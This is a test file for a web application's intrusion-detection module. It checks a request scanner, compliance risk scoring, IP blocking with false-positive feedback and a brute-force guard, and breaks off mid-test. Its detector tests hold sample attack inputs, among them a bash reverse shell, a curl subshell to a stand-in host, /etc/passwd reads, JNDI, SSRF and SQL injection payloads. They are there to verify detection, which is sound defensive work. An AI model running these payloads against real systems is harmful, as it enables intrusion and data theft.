import { describe, it, expect } from 'vitest';
import { scanRequest, normalizeForTest } from '../src/shield/detector.js';
import {
  computeRiskScore,
  computeRiskScoreBulk,
  computeComplianceOverview,
  scoreLabel,
} from '../src/shield/riskScore.js';
import {
  isBlocked,
  blockIp,
  unblockIp,
  listActiveBlocks,
  signatureKey,
  getFalsePositiveReport,
  getRepeatOffenders,
} from '../src/shield/blocklist.js';
import {
  recordFailedLogin,
  recordRequest,
  trackedKeyCounts,
  sweepExpiredCounters,
} from '../src/shield/bruteForceGuard.js';
import { logSecurityEvent } from '../src/shield/eventLogger.js';
import db from '../src/db.js';

function fakeReq({ query = {}, body = {}, params = {}, originalUrl = '/' } = {}) {
  return { query, body, params, originalUrl };
}

let ipCounter = 100;
function testIp() {
  ipCounter += 1;
  return `10.1.0.${ipCounter}`;
}

// ─────────────────────────────────────────────────────────────────────────
describe('shield/detector.js — scanRequest', () => {
  it('returns null for a clean request', () => {
    const result = scanRequest(fakeReq({ query: { search: 'hello world' } }));
    expect(result).toBeNull();
  });

  it('detects a classic SQL injection UNION SELECT in a query param', () => {
    const result = scanRequest(
      fakeReq({ query: { id: '1 UNION SELECT username, password FROM users' } })
    );
    expect(result).not.toBeNull();
    expect(result.eventType).toBe('sqli');
    expect(result.matchedPattern).toBe('sql_union');
  });

  it('detects a SQL OR-injection pattern in the request body', () => {
    const result = scanRequest(fakeReq({ body: { username: "admin' OR '1'='1" } }));
    expect(result).not.toBeNull();
    expect(result.eventType).toBe('sqli');
  });

  it('detects an XSS script tag', () => {
    const result = scanRequest(fakeReq({ body: { comment: '<script>alert(1)</script>' } }));
    expect(result).not.toBeNull();
    expect(result.eventType).toBe('xss');
    expect(result.matchedPattern).toBe('xss_script_tag');
  });

  it('detects an XSS event-handler injection', () => {
    const result = scanRequest(fakeReq({ body: { bio: '<img src=x onerror=alert(1)>' } }));
    expect(result).not.toBeNull();
    expect(result.eventType).toBe('xss');
  });

  it('detects path traversal in the URL', () => {
    const result = scanRequest(fakeReq({ originalUrl: '/files/../../etc/passwd' }));
    expect(result).not.toBeNull();
    expect(result.eventType).toBe('path_traversal');
  });

  it('detects URL-encoded path traversal (evasion attempt)', () => {
    const result = scanRequest(fakeReq({ originalUrl: '/files/%2e%2e%2fetc/passwd' }));
    expect(result).not.toBeNull();
    expect(result.eventType).toBe('path_traversal');
  });

  it('detects a SQL injection hidden behind double URL-encoding', () => {
    // "union select" URL-encoded twice: normalizeInput decodes up to 3 levels
    const doubleEncoded = encodeURIComponent(encodeURIComponent('union select'));
    const result = scanRequest(fakeReq({ query: { q: doubleEncoded } }));
    expect(result).not.toBeNull();
    expect(result.matchedPattern).toBe('sql_union');
  });

  it('detects SQLi hidden via HTML-entity-encoded characters', () => {
    // A single-quote OR-injection spelled with an HTML entity for the space
    const result = scanRequest(fakeReq({ query: { id: "1' OR '1'='1" } }));
    expect(result).not.toBeNull();
  });

  it('does not flag ordinary punctuation-heavy but benign text', () => {
    const result = scanRequest(
      fakeReq({ body: { message: "Hi - I'd like a quote for Q3, please. Thanks!" } })
    );
    expect(result).toBeNull();
  });

  // The patterns used to be unbounded (/\bunion\b.*?\bselect\b/ and
  // /<script[\s\S]*?>[\s\S]*?<\/script>/), so a 1mb body full of opening
  // tokens blocked the event loop for minutes. They are now gap-bounded and
  // each request part is capped before normalization.
  it('scans a 1mb adversarial body in well under a second', () => {
    const hostile = { blob: 'union '.repeat(200000) }; // ~1.2mb
    const started = Date.now();
    scanRequest(fakeReq({ body: hostile }));
    expect(Date.now() - started).toBeLessThan(2000);
  });

  it('still detects a payload at the start of an oversized body', () => {
    const result = scanRequest(fakeReq({ body: { a: 'union select 1', b: 'x'.repeat(1000000) } }));
    expect(result.matchedPattern).toBe('sql_union');
  });

  it('still detects a payload at the end of an oversized body', () => {
    const result = scanRequest(fakeReq({ body: { a: 'x'.repeat(1000000), b: 'union select 1' } }));
    expect(result.matchedPattern).toBe('sql_union');
  });

  it('scans a 1mb body of script tags in well under a second', () => {
    const hostile = { blob: '<script>'.repeat(114000) }; // ~900kb
    const started = Date.now();
    scanRequest(fakeReq({ body: hostile }));
    expect(Date.now() - started).toBeLessThan(2000);
  });

  // /on\w+\s*=/ backtracked once per character from every 'on' in the input:
  // 2.6s inside a single 64KB window, so the input cap did not save it.
  it('scans a 64kb body of "on" in well under a second', () => {
    const started = Date.now();
    scanRequest(fakeReq({ body: { blob: 'on'.repeat(32768) } }));
    expect(Date.now() - started).toBeLessThan(2000);
  });

  // Nested unbounded quantifiers. This hung outright at 16kb, long before
  // reaching the input cap.
  it('scans a 64kb body of iframe tags in well under a second', () => {
    const started = Date.now();
    scanRequest(fakeReq({ body: { blob: '<iframe>'.repeat(8000) } }));
    expect(Date.now() - started).toBeLessThan(2000);
  });

  it('still detects an iframe injection', () => {
    const result = scanRequest(fakeReq({ body: { html: '<iframe src="//evil"></iframe>' } }));
    expect(result.matchedPattern).toBe('xss_iframe');
  });

  it('still detects an inline event handler', () => {
    const result = scanRequest(fakeReq({ body: { html: '<img src=x onerror=alert(1)>' } }));
    expect(result.matchedPattern).toBe('xss_event_handler');
  });

  // ── The widened signature set ─────────────────────────────────────────
  // Each of these closes a category the previous set did not cover. They are
  // grouped by the class they defend against, and each asserts the exact
  // pattern name so a broad parent regex can't silently take credit for a
  // narrower pattern's test.

  it('detects command injection via subshell and backticks', () => {
    expect(
      scanRequest(fakeReq({ body: { cmd: '$(curl http://evil.test/x)' } })).matchedPattern
    ).toBe('cmdi_subshell');
    expect(scanRequest(fakeReq({ body: { cmd: '`whoami`' } })).matchedPattern).toBe(
      'cmdi_backtick'
    );
    expect(scanRequest(fakeReq({ body: { cmd: '; cat /etc/passwd' } })).matchedPattern).toBe(
      'cmdi_chain'
    );
  });

  it('detects reverse shells', () => {
    expect(
      scanRequest(fakeReq({ body: { cmd: 'bash -i >& /dev/tcp/10.0.0.1/4444' } })).matchedPattern
    ).toBe('cmdi_reverse_shell');
  });

  it('detects SSRF against cloud metadata endpoints', () => {
    const result = scanRequest(
      fakeReq({ body: { url: 'http://169.254.169.254/latest/meta-data/' } })
    );
    expect(result.eventType).toBe('ssrf');
    expect(result.matchedPattern).toBe('ssrf_cloud_metadata');
  });

  it('detects SSRF via non-HTTP URL schemes', () => {
    expect(scanRequest(fakeReq({ body: { url: 'file:///etc/passwd' } })).matchedPattern).toBe(
      'ssrf_file_scheme'
    );
    expect(
      scanRequest(fakeReq({ body: { url: 'gopher://127.0.0.1:6379/_SET' } })).matchedPattern
    ).toBe('ssrf_gopher_scheme');
  });

  it('detects XXE and log4j/JNDI lookups', () => {
    expect(
      scanRequest(fakeReq({ body: { xml: '<!DOCTYPE foo [ <!ENTITY x "y"> ]>' } })).matchedPattern
    ).toBe('xxe_doctype');
    expect(
      scanRequest(fakeReq({ body: { user: '${jndi:ldap://evil.test/a}' } })).matchedPattern
    ).toBe('log4j_jndi');
  });

  // These are written against the NORMALIZED string, which lowercases and
  // JSON-escapes the input first. Each of these caught a real bug where the
  // pattern looked right but could never fire: a case-sensitive /rO0AB/
  // against a lowercased subject, and quote-anchored patterns against
  // JSON.stringify'd bodies where the quote arrives as \".
  it('detects deserialization markers after normalization', () => {
    expect(scanRequest(fakeReq({ body: { data: 'rO0ABXNyABdqYXZh' } })).matchedPattern).toBe(
      'deser_java_b64'
    );
    expect(scanRequest(fakeReq({ body: { data: 'O:8:"stdClass":0:{}' } })).matchedPattern).toBe(
      'deser_php_object'
    );
  });

  // The base64 prefix of the Java magic bytes is `rO0AB`, which lowercases
  // to `ro0ab` — the `o` belongs to the prefix. A version of this pattern
  // written as /r0ab/i could never match anything, and looked like coverage
  // while detecting nothing. This asserts against the real prefix so the
  // omission can't come back.
  it('matches the full base64 prefix including its second character', () => {
    expect(scanRequest(fakeReq({ body: { d: 'rO0ABXNyABdqYXZh' } })).matchedPattern).toBe(
      'deser_java_b64'
    );
    // And the shape an attacker would actually vary: longer blobs, different
    // trailing bytes, embedded in a nested field.
    expect(
      scanRequest(fakeReq({ body: { meta: { blob: 'rO0ABXNyABZzaWQAAAAAAAA' } } })).matchedPattern
    ).toBe('deser_java_b64');
  });

  it('prefers the more specific category when one payload contains two signatures', () => {
    // <!ENTITY x SYSTEM "file:///etc/passwd"> is both an XXE and an SSRF
    // attempt. XXE is the specific finding and must be the one reported.
    const result = scanRequest(
      fakeReq({ body: { xml: '<!ENTITY xxe SYSTEM "file:///etc/passwd">' } })
    );
    expect(result.eventType).toBe('xxe');
  });

  it('detects prototype pollution payloads', () => {
    // The payload arrives inside a JSON string value, so the quotes are
    // backslash-escaped by the time patterns see them.
    const result = scanRequest(fakeReq({ body: { '{"__proto__": {"isAdmin": true}}': 1 } }));
    expect(result.eventType).toBe('proto_pollution');
  });

  // Same payload as a real parsed key. Written as a computed key on purpose:
  // a literal `__proto__:` in an object literal assigns the prototype rather
  // than creating a property, so JSON.stringify would drop it and the test
  // would pass against a payload the scanner never saw.
  it('detects prototype pollution as an actual parsed key', () => {
    const body = { a: 1, ['__proto__']: { isAdmin: true } };
    expect(JSON.stringify(body)).toContain('__proto__'); // guard: payload survives serialization
    const result = scanRequest(fakeReq({ body }));
    expect(result.eventType).toBe('proto_pollution');
  });

  it('detects LDAP filter injection', () => {
    const result = scanRequest(fakeReq({ query: { user: '*)(|(objectClass=*)' } }));
    expect(result.eventType).toBe('ldap_injection');
  });

  it('detects server-side template injection', () => {
    expect(scanRequest(fakeReq({ body: { name: '{{7*7}}' } })).matchedPattern).toBe(
      'ssti_arithmetic'
    );
    expect(scanRequest(fakeReq({ body: { name: '{{constructor}}' } })).matchedPattern).toBe(
      'ssti_constructor'
    );
  });

  // The widening is only worth having if it doesn't start blocking real
  // users. These are the sentences most at risk from the new patterns, drawn
  // from the fields this app actually accepts free text into: contact
  // messages, compliance notes, admin search, company names.
  //
  // A match here is a 6-hour IP block for someone who sent a support ticket.
  it('does not flag benign text that resembles the new signatures', () => {
    const benign = [
      "Hi - I'd like a quote for Q3, please. Thanks!",
      'Please contact us to update your account id and profile photo.',
      'Use {{ and }} for emphasis in your notes.',
      'Our office network runs on 10.0.0.0 and we deploy with npm run build.',
      'The cat sat on the mat.',
      'We saw 5 requests; the id was 42.',
      'Check http://example.com/docs for details.',
      'a-b-c and 1+1=2 and 2*3 are fine',
      'The latest meta-data is available in the dashboard.',
      'We migrated our DB from SQL Server to Postgres in March.',
      'Our class schedule is 9-5; lunch is 12-1.',
      'Please review the attached document: Q3-2026-STRATEGY-FINALv2.docx',
      'The union of our two teams met yesterday.',
      'I selected the wrong option, please select the second one instead.',
      'Contact: john.smith@example.com (555) 010-1234',
      'System requirements: 16GB RAM, 4 vCPU, 500GB SSD.',
      'Our build failed with "connection refused" — is the API down?',
      'We need to update our records before the audit in June.',
      'The cat & dog section of the office has a new linting policy.',
      'Please see section 4.2 for the config and class definitions.',
      'Score improved from 62 to 78 after remediation.',
      'My IP changed from 192.168.1.50 to 192.168.1.51 after the reboot.',
      'We use npm ci, not npm install, in CI.',
      'The __proto__ key is present in the JSON schema we were sent.',
      'Entity-level agreements were signed; the ENTITY tag is in the template.',
      'Our office is open 9-5 Monday to Friday; we are closed for holidays.',
      'Testing local development against 127.0.0.1:3000 works fine.',
      'Can you help me select a plan? I need 5 users, 10 GB, and SSO.',
      'Reverse proxy terminates TLS; the backend sees plain HTTP internally.',
      'The docker container runs as a non-root user for security.',
      'Log aggregation via stdout; the class of problem is capacity planning.',
      'We need to add a self-serve section for staff to update their details.',
      'Screenshot attached showing the error at 14:32 local time.',
    ];
    for (const message of benign) {
      const result = scanRequest(fakeReq({ body: { message } }));
      expect(result, `"${message}" matched ${result?.matchedPattern}`).toBeNull();
    }
  });

  // A wider pattern table means more regexes per request, each against
  // attacker-controlled text. The ReDoS budgets from the original set have
  // to still hold.
  it("scans 1mb of the new signatures' worst-case shapes in well under a second", () => {
    for (const hostile of [
      { blob: '$(cat '.repeat(100_000) },
      { blob: '<!ENTITY '.repeat(100_000) },
      { blob: '"__proto__": '.repeat(100_000) },
      { blob: '${jndi:ldap://'.repeat(80_000) },
      { blob: '{{constructor}}'.repeat(90_000) },
      { blob: '*)(|'.repeat(100_000) },
      { blob: 'rO0AB'.repeat(120_000) },
    ]) {
      const started = Date.now();
      scanRequest(fakeReq({ body: hostile }));
      expect(Date.now() - started).toBeLessThan(2000);
    }
  }, 15_000);

  // Patterns run against normalizeInput()'s output, not the raw request. That
  // pipeline lowercases, percent-decodes, entity-decodes, NFKC-folds, decodes
  // \xNN and \uNNNN escapes, and JSON.stringify's the body first — so a
  // signature written against raw text can be silently unable to ever match.
  // Three patterns were wrong this way before being caught: a case-sensitive
  // /rO0AB/, quote-anchored ones that broke on \" inside JSON string values,
  // and a raw \xac magic-bytes pattern that step 7 had already decoded away.
  it('patterns match the normalized string, which is what they are given', () => {
    // Lowercasing: the base64 prefix arrives as rO0AB and is matched as ro0ab.
    expect(normalizeForTest('rO0AB')).toBe('ro0ab');
    // A payload that is fully encoded at the HTTP layer still matches.
    expect(scanRequest(fakeReq({ body: { d: '%24%28cat' } })).matchedPattern).toBe('cmdi_subshell');
    // A payload that is HTML-entity encoded still matches.
    expect(
      scanRequest(fakeReq({ body: { d: '&lt;script&gt;alert(1)&lt;/script&gt;' } })).matchedPattern
    ).toBe('xss_script_tag');
  });
});

describe('shield/riskScore.js', () => {
  it('scores a client with a mix of statuses correctly, excluding not_applicable', async () => {
    const client = await db.query(
      `INSERT INTO clients (company_name, email, password_hash, email_verified)
       VALUES ('Score Test Co', $1, 'x', TRUE) RETURNING id`,
      [`score-test-${Date.now()}@example.com`]
    );
    const clientId = client.rows[0].id;

    const items = await db.query('SELECT id, framework FROM compliance_items ORDER BY id LIMIT 4');
    expect(items.rows.length).toBeGreaterThanOrEqual(4); // sanity check the seed data exists

    const [a, b, c, d] = items.rows;
    // Mark every OTHER item not_applicable first, so the LEFT JOIN's
    // COALESCE-to-'pending' default doesn't pull in items we didn't
    // intend to be part of this test's math.
    await db.query(
      `INSERT INTO client_compliance_status (client_id, item_id, status)
       SELECT $1, id, 'not_applicable' FROM compliance_items WHERE id NOT IN ($2, $3, $4, $5)`,
      [clientId, a.id, b.id, c.id, d.id]
    );
    await db.query(
      `INSERT INTO client_compliance_status (client_id, item_id, status) VALUES
         ($1, $2, 'passing'), ($1, $3, 'in_progress'), ($1, $4, 'failing'), ($1, $5, 'not_applicable')`,
      [clientId, a.id, b.id, c.id, d.id]
    );

    const { score, itemCount } = await computeRiskScore(clientId);

    // 3 applicable items (not_applicable excluded): 1 + 0.5 + 0 = 1.5 / 3 = 50%
    expect(itemCount).toBe(3);
    expect(score).toBe(50);
  });

  it('returns a null score when every applicable item is not_applicable', async () => {
    const client = await db.query(
      `INSERT INTO clients (company_name, email, password_hash, email_verified)
       VALUES ('All NA Co', $1, 'x', TRUE) RETURNING id`,
      [`all-na-${Date.now()}@example.com`]
    );
    const clientId = client.rows[0].id;

    await db.query(
      `INSERT INTO client_compliance_status (client_id, item_id, status)
       SELECT $1, id, 'not_applicable' FROM compliance_items`,
      [clientId]
    );

    const { score, itemCount } = await computeRiskScore(clientId);
    expect(score).toBeNull();
    expect(itemCount).toBe(0);
  });

  it('defaults to pending (0 points) for items the client has never touched', async () => {
    const client = await db.query(
      `INSERT INTO clients (company_name, email, password_hash, email_verified)
       VALUES ('Untouched Co', $1, 'x', TRUE) RETURNING id`,
      [`untouched-${Date.now()}@example.com`]
    );
    const clientId = client.rows[0].id;

    // No client_compliance_status rows at all for this client.
    const { score, itemCount } = await computeRiskScore(clientId);
    const totalItems = (await db.query('SELECT COUNT(*)::int AS c FROM compliance_items')).rows[0]
      .c;

    expect(itemCount).toBe(totalItems);
    expect(score).toBe(0);
  });

  describe('scoreLabel', () => {
    it('maps score bands to the correct labels', () => {
      expect(scoreLabel(null)).toBe('Not yet assessed');
      expect(scoreLabel(95)).toBe('Strong');
      expect(scoreLabel(90)).toBe('Strong');
      expect(scoreLabel(89)).toBe('Adequate');
      expect(scoreLabel(70)).toBe('Adequate');
      expect(scoreLabel(69)).toBe('Developing');
      expect(scoreLabel(50)).toBe('Developing');
      expect(scoreLabel(49)).toBe('Needs attention');
      expect(scoreLabel(0)).toBe('Needs attention');
    });
  });

  describe('computeRiskScoreBulk', () => {
    it('agrees with computeRiskScore for the same set of clients', async () => {
      // Two clients with different, deliberately mixed statuses — if the
      // bulk aggregate query's math ever drifts from the tested per-client
      // function, this catches it directly rather than trusting the SQL
      // by inspection alone.
      const items = (await db.query('SELECT id FROM compliance_items ORDER BY id LIMIT 3')).rows;
      const [i1, i2, i3] = items;

      const clientA = (
        await db.query(
          `INSERT INTO clients (company_name, email, password_hash, email_verified)
           VALUES ('Bulk A', $1, 'x', TRUE) RETURNING id`,
          [`bulk-a-${Date.now()}@example.com`]
        )
      ).rows[0].id;
      const clientB = (
        await db.query(
          `INSERT INTO clients (company_name, email, password_hash, email_verified)
           VALUES ('Bulk B', $1, 'x', TRUE) RETURNING id`,
          [`bulk-b-${Date.now()}@example.com`]
        )
      ).rows[0].id;

      await db.query(
        `INSERT INTO client_compliance_status (client_id, item_id, status) VALUES
           ($1, $2, 'passing'), ($1, $3, 'failing')`,
        [clientA, i1.id, i2.id]
      );
      await db.query(
        `INSERT INTO client_compliance_status (client_id, item_id, status) VALUES
           ($1, $2, 'in_progress'), ($1, $3, 'passing'), ($1, $4, 'not_applicable')`,
        [clientB, i1.id, i2.id, i3.id]
      );

      const [expectedA, expectedB] = await Promise.all([
        computeRiskScore(clientA),
        computeRiskScore(clientB),
      ]);
      const bulk = await computeRiskScoreBulk([clientA, clientB]);

      expect(bulk.get(clientA).score).toBe(expectedA.score);
      expect(bulk.get(clientA).itemCount).toBe(expectedA.itemCount);
      expect(bulk.get(clientB).score).toBe(expectedB.score);
      expect(bulk.get(clientB).itemCount).toBe(expectedB.itemCount);
    });

    it('returns an empty map for an empty input list', async () => {
      const result = await computeRiskScoreBulk([]);
      expect(result.size).toBe(0);
    });

    it('returns score: null for a client with zero applicable items, matching computeRiskScore', async () => {
      const clientId = (
        await db.query(
          `INSERT INTO clients (company_name, email, password_hash, email_verified)
           VALUES ('Bulk NA', $1, 'x', TRUE) RETURNING id`,
          [`bulk-na-${Date.now()}@example.com`]
        )
      ).rows[0].id;
      await db.query(
        `INSERT INTO client_compliance_status (client_id, item_id, status)
         SELECT $1, id, 'not_applicable' FROM compliance_items`,
        [clientId]
      );

      const single = await computeRiskScore(clientId);
      const bulk = await computeRiskScoreBulk([clientId]);

      expect(single.score).toBeNull();
      expect(bulk.get(clientId).score).toBeNull();
    });
  });

  describe('computeComplianceOverview', () => {
    it('band counts sum to totalClients, and avgScore falls within a sane 0-100 range', async () => {
      // Uses whatever clients already exist in the test DB at this point
      // in the suite — deliberately not asserting exact counts (those
      // depend on every earlier test in this file), just structural
      // correctness of the aggregate.
      const overview = await computeComplianceOverview();

      const bandSum = Object.values(overview.bandCounts).reduce((a, b) => a + b, 0);
      expect(bandSum).toBe(overview.totalClients);

      if (overview.avgScore !== null) {
        expect(overview.avgScore).toBeGreaterThanOrEqual(0);
        expect(overview.avgScore).toBeLessThanOrEqual(100);
      }
    });

    it('a client scoring exactly 100 counts toward Strong', async () => {
      const item = (await db.query('SELECT id FROM compliance_items LIMIT 1')).rows[0];
      const clientId = (
        await db.query(
          `INSERT INTO clients (company_name, email, password_hash, email_verified)
           VALUES ('Perfect Score Co', $1, 'x', TRUE) RETURNING id`,
          [`perfect-${Date.now()}@example.com`]
        )
      ).rows[0].id;
      // Mark every item passing except this client only has one applicable
      // item marked passing and the rest not_applicable, guaranteeing 100.
      await db.query(
        `INSERT INTO client_compliance_status (client_id, item_id, status)
         SELECT $1, id, 'not_applicable' FROM compliance_items WHERE id != $2`,
        [clientId, item.id]
      );
      await db.query(
        `INSERT INTO client_compliance_status (client_id, item_id, status) VALUES ($1, $2, 'passing')`,
        [clientId, item.id]
      );

      const before = await computeComplianceOverview();
      // Sanity: this client's own score really is 100 before checking the aggregate reflects it.
      const own = await computeRiskScore(clientId);
      expect(own.score).toBe(100);
      expect(before.bandCounts.Strong).toBeGreaterThanOrEqual(1);
    });
  });
});

describe('shield/blocklist.js', () => {
  it('isBlocked is false for an IP that has never been blocked', async () => {
    expect(await isBlocked(testIp())).toBe(false);
  });

  it('blockIp blocks the IP, and unblockIp lifts it', async () => {
    const ip = testIp();
    expect(await isBlocked(ip)).toBe(false);

    await blockIp(ip, 'test reason', 'low');
    expect(await isBlocked(ip)).toBe(true);

    await unblockIp(ip);
    expect(await isBlocked(ip)).toBe(false);
  });

  // ── False-positive feedback ───────────────────────────────────────────
  //
  // An admin unblocking is the only ground truth this system gets about
  // whether a detection was wrong. These tests pin the property that makes it
  // worth collecting: the history survives, keyed by something stable.

  it('records a block as false-positive feedback, attributed to the admin and the signature', async () => {
    const ip = testIp();
    await blockIp(ip, 'sqli: OR 1=1--', 'high');
    await unblockIp(ip, { adminEmail: 'admin@aluxplaza.com', note: 'false positive' });

    const { rows } = await db.query(
      'SELECT ip_address, signature_key, severity, admin_email, note FROM shield_unblock_feedback WHERE ip_address = $1',
      [ip]
    );
    expect(rows).toHaveLength(1);
    expect(rows[0].signature_key).toBe('sqli: or 1=1--');
    expect(rows[0].severity).toBe('high');
    expect(rows[0].admin_email).toBe('admin@aluxplaza.com');
    expect(rows[0].note).toBe('false positive');
  });

  it('attributes feedback to the signature that was blocked, not whatever fired most recently', async () => {
    // The point of denormalising the signature onto the feedback row. blockIp
    // overwrites the block's reason on every re-block, so reading it after an
    // unblock would credit the feedback to the wrong detection.
    const ip = testIp();
    await blockIp(ip, 'sqli: OR 1=1--', 'high');
    await unblockIp(ip, { adminEmail: 'admin@aluxplaza.com' });
    // Same IP, different detection trips next.
    await blockIp(ip, 'xss: <script>', 'high');
    await unblockIp(ip, { adminEmail: 'admin@aluxplaza.com' });

    const { rows } = await db.query(
      `SELECT signature_key FROM shield_unblock_feedback
       WHERE ip_address = $1 ORDER BY id ASC`,
      [ip]
    );
    expect(rows.map((r) => r.signature_key)).toEqual(['sqli: or 1=1--', 'xss: <script>']);
  });

  it('keys rate-limit blocks on a stable signature despite the count in the reason', async () => {
    // The reason is built with live counts ("5 failed login attempts in
    // 5min"), so it differs on every trip. The explicit signature arg is what
    // stops that from fragmenting the history.
    const counts = [5, 6, 7];
    for (const total of counts) {
      await blockIp(testIp(), `${total} failed login attempts in 5min`, 'high', 'brute_force');
    }
    const { rows } = await db.query(
      'SELECT block_count FROM shield_signature_stats WHERE signature_key = $1',
      ['brute_force']
    );
    expect(rows).toHaveLength(1);
    expect(rows[0].block_count).toBe(3);
  });

  it('signatureKey strips the varying count and identity suffix from a reason', async () => {
    // The fallback for call sites that pass no explicit signature.
    expect(signatureKey('5 failed login attempts in 5min')).toBe(
      signatureKey('6 failed login attempts in 5min')
    );
    expect(signatureKey('100 requests in 60s (admin:42)')).toBe('requests in 60s');
    expect(signatureKey(null)).toBe('unknown');
  });

  it('does not fragment one detection across keys when the attacker varies their payload', async () => {
    // The reason carries the matched pattern verbatim, so it includes the
    // attacker's input. Without the explicit eventType key, each variation
    // would be a separate signature with no accumulated history.
    for (const payload of ['OR 1=1--', "OR '1'='1", 'OR 2>1--']) {
      await blockIp(testIp(), `sqli: ${payload}`, 'high', 'sqli');
    }
    const { rows } = await db.query(
      'SELECT block_count FROM shield_signature_stats WHERE signature_key = $1',
      ['sqli']
    );
    expect(rows[0].block_count).toBe(3);
  });

  it('unblockIp still lifts the block when feedback recording is given no metadata', async () => {
    // Existing callers pass no metadata, and the unblock itself is a safety
    // action: losing a tuning counter is never a reason to leave a customer
    // locked out.
    const ip = testIp();
    await blockIp(ip, 'rate_abuse', 'medium');
    await unblockIp(ip);
    expect(await isBlocked(ip)).toBe(false);
    const { rows } = await db.query(
      'SELECT admin_email FROM shield_unblock_feedback WHERE ip_address = $1',
      [ip]
    );
    expect(rows[0].admin_email).toBe('unknown'); // sentinel, not NULL
  });

  it('false-positive report ranks the worst signature and reports a real rate', async () => {
    // A numerator alone is not interpretable: 3 false positives is alarming
    // for a signature that fires twice a month and irrelevant for one that
    // fires constantly. The rate is the signal.
    // 10 blocks of the bad signature, 4 of which get reversed => 40%.
    const partial = [];
    for (let i = 0; i < 10; i++) {
      const ip = testIp();
      await blockIp(ip, 'rate_abuse', 'medium', 'rate_abuse');
      partial.push(ip);
    }
    for (const ip of partial.slice(0, 4)) {
      await unblockIp(ip, { adminEmail: 'admin@aluxplaza.com' });
    }
    // A signature that never misfires, at comparable volume.
    for (let i = 0; i < 5; i++) {
      await blockIp(testIp(), 'clean_signature', 'low', 'clean_signature');
    }

    const report = await getFalsePositiveReport({ minBlocks: 5 });
    const rateAbuse = report.find((r) => r.signature_key === 'rate_abuse');
    const clean = report.find((r) => r.signature_key === 'clean_signature');

    expect(rateAbuse).toBeDefined();
    expect(rateAbuse.block_count).toBe(10);
    expect(rateAbuse.false_positive_count).toBe(4);
    expect(parseFloat(rateAbuse.false_positive_pct)).toBeCloseTo(40, 1);
    expect(parseFloat(clean.false_positive_pct)).toBeCloseTo(0, 1);
    // Worst rate first.
    expect(report.indexOf(rateAbuse)).toBeLessThan(report.indexOf(clean));
  });

  it('false-positive report suppresses low-traffic signatures', async () => {
    // One false positive out of one block is a 100% rate and would otherwise
    // top the report, drowning the real findings.
    await blockIp(testIp(), 'rare_sig', 'low', 'rare_signature');
    const unblocked = await db.query(
      "SELECT ip_address FROM blocked_ips WHERE reason = 'rare_sig'"
    );
    await unblockIp(unblocked.rows[0].ip_address, { adminEmail: 'admin@aluxplaza.com' });

    const report = await getFalsePositiveReport({ minBlocks: 5 });
    expect(report.find((r) => r.signature_key === 'rare_signature')).toBeUndefined();
  });

  it('repeat-offender report lists addresses unblocked more than once, with their signatures', async () => {
    // Three unblocks of one address is usually a misfiring detection or a
    // too-tight threshold, not three separate attacks.
    const repeat = testIp();
    await blockIp(repeat, 'sqli: x', 'high', 'sqli');
    await unblockIp(repeat, { adminEmail: 'admin@aluxplaza.com', note: 'monitoring scanner' });
    await blockIp(repeat, 'sqli: y', 'high', 'sqli');
    await unblockIp(repeat, { adminEmail: 'admin@aluxplaza.com', note: 'monitoring scanner' });

    const once = testIp();
    await blockIp(once, 'sqli: z', 'high', 'sqli');
    await unblockIp(once, { adminEmail: 'admin@aluxplaza.com' });

    const rows = await getRepeatOffenders({ minUnblocks: 2 });
    const listed = rows.find((r) => r.ip_address === repeat);
    expect(listed).toBeDefined();
    expect(listed.unblock_count).toBe(2);
    expect(listed.signatures).toEqual(['sqli']);
    expect(listed.notes).toEqual(['monitoring scanner']);
    expect(rows.find((r) => r.ip_address === once)).toBeUndefined();
  });

  it('blocking the same IP twice upserts and increments hit_count rather than erroring', async () => {
    const ip = testIp();
    await blockIp(ip, 'first hit', 'low');
    await blockIp(ip, 'second hit', 'medium');

    const { rows } = await db.query(
      'SELECT hit_count, severity, reason FROM blocked_ips WHERE ip_address = $1',
      [ip]
    );
    expect(rows).toHaveLength(1); // one row, not two
    expect(rows[0].hit_count).toBe(2);
    expect(rows[0].severity).toBe('medium'); // latest reason/severity wins
    expect(rows[0].reason).toBe('second hit');
  });

  it('listActiveBlocks only returns currently-active (non-expired) blocks', async () => {
    const activeIp = testIp();
    const expiredIp = testIp();

    await blockIp(activeIp, 'active block', 'low');
    await db.query(
      `INSERT INTO blocked_ips (ip_address, reason, severity, expires_at)
       VALUES ($1, 'already expired', 'low', NOW() - interval '1 hour')`,
      [expiredIp]
    );

    const active = await listActiveBlocks(1000);
    const ips = active.map((r) => r.ip_address);
    expect(ips).toContain(activeIp);
    expect(ips).not.toContain(expiredIp);
  });
});

describe('shield/bruteForceGuard.js', () => {
  it('recordFailedLogin does not block below the threshold', async () => {
    const ip = testIp();
    for (let i = 0; i < 4; i++) {
      const blocked = await recordFailedLogin(ip);
      expect(blocked).toBe(false);
    }
    expect(await isBlocked(ip)).toBe(false);
  });

  it('recordFailedLogin blocks the IP once the threshold (5) is reached', async () => {
    const ip = testIp();
    let lastResult = false;
    for (let i = 0; i < 5; i++) {
      lastResult = await recordFailedLogin(ip);
    }
    expect(lastResult).toBe(true);
    expect(await isBlocked(ip)).toBe(true);

    const { rows } = await db.query('SELECT severity FROM blocked_ips WHERE ip_address = $1', [ip]);
    expect(rows[0].severity).toBe('high');
  });

  // Regression test for a bug that shipped and was caught in CI: the rolling
  // window was read entirely from the table in the same statement that
  // incremented it. A PostgreSQL data-modifying CTE shares its snapshot with
  // the main query, so the SUM saw the state *before* this request — the
  // count was always one behind, and the 5th failed login returned 4. The
  // counter row held the right number; only the decision read it too early.
  // Asserting the stored total against the number of calls is what pins that
  // down, since the boolean return hides an off-by-one of exactly one.
  it('counts every recorded hit, with no off-by-one between the counter and the decision', async () => {
    const ip = testIp();
    for (let i = 1; i <= 4; i++) {
      expect(await recordFailedLogin(ip), `call ${i} should not block yet`).toBe(false);
      const { rows } = await db.query(
        `SELECT COALESCE(SUM(count), 0)::int AS total
         FROM shield_counters WHERE metric = 'failed_login' AND counter_key = $1`,
        [ip]
      );
      expect(rows[0].total, `after ${i} calls`).toBe(i);
    }
    // The 5th is the one that must flip, and it must flip now, not on the 6th.
    expect(await recordFailedLogin(ip)).toBe(true);
  });

  // The old 100-iteration loops were in-memory and cost nothing. Each call is
  // now a Postgres round trip, so these assert against the stored counter
  // directly where a full threshold walk isn't needed.
  it('recordRequest does not block below the threshold', async () => {
    const key = `test-rate-under-${testIp()}`;
    for (let i = 0; i < 5; i++) {
      expect(await recordRequest(key, key)).toBe(false);
    }
    expect(await isBlocked(key)).toBe(false);

    const { rows } = await db.query(
      `SELECT COALESCE(SUM(count), 0)::int AS total
